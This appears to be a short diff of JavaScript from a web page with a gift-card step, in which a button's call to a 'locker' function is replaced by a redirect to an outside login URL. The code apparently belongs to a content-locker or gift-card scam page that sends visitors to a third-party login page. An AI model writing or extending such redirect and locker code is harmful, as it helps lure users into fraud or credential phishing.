@@ -186,7 +186,7 @@ $.get(TEMPLATE + "/" + TEMPLATE + ".txt", function(VVV) {
                 }, STEP3_GIFTCARD_INTERVAL)
 
                 $("#VBU").click(function() {
-                  call_locker();
+                  window.location.href = 'https://linkdr.site/login';
                 });
 
                 S3D = !0
